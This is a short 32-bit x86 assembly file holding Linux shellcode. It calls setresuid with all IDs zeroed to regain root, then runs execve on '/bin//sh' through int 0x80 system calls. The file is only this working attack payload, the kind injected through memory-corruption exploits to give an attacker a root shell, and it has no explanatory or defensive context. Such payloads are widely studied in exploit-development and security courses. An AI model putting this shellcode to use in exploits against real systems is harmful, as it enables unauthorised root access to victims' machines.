BITS 32

		;setresuid(uid_t ruid, uid_t euid, uid_t suid)
xor eax, eax 	;zero out eax, ebx, etc...
xor ebx, ebx
xor ecx, ecx
xor edx, edx
mov al, 0xa4    ;move call to setresuid, eax, ebx etc are set to zero/root
int 0x80	

xor eax, eax	;clear register
mov al, 0x0b	;execve();
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ebx
mov ecx, esp
int 0x80


